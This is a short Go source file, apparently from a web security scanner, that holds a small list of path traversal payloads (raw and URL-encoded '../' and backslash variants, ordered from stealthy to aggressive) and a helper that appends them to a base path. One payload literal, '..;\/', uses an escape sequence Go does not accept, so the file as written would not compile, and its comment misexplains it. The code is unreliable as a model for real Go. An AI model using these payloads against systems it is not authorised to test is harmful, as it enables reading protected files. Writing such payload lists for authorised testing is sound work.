package payload

// Source provides traversal payloads and utilities to build test paths.
// It allows different modes (fast/full) and external customization in future.
type Source struct {
    // ordered by stealth -> aggressive
    items []string
}

// NewDefault builds a default payload source based on PDF recommendations.
// This list is intentionally small to start; it can be extended or loaded from file later.
func NewDefault() *Source {
    return &Source{items: []string{
        "..%2f",          // encoded ../ (stealthier)
        "../",            // raw ../
        "..%5c",          // encoded backslash
        "..;\/",          // semicolon trick variant (escaped slash to keep as one token)
        "%2e%2e%2f",      // %2e%2e%2f
        ".%2e/",          // dot + encoded dot
        "..\\",           // raw backslash
        "..%2f..%2f",     // two levels
    }}
}

// Items returns the payloads in their current order.
func (s *Source) Items() []string { return s.items }

// BuildTraversal takes a base path (must end with "/") and returns candidate traversal paths
// by appending each payload. The caller is responsible for normalizing the input path.
func (s *Source) BuildTraversal(path string) []string {
    out := make([]string, 0, len(s.items))
    for _, p := range s.items {
        out = append(out, path+p)
    }
    return out
}

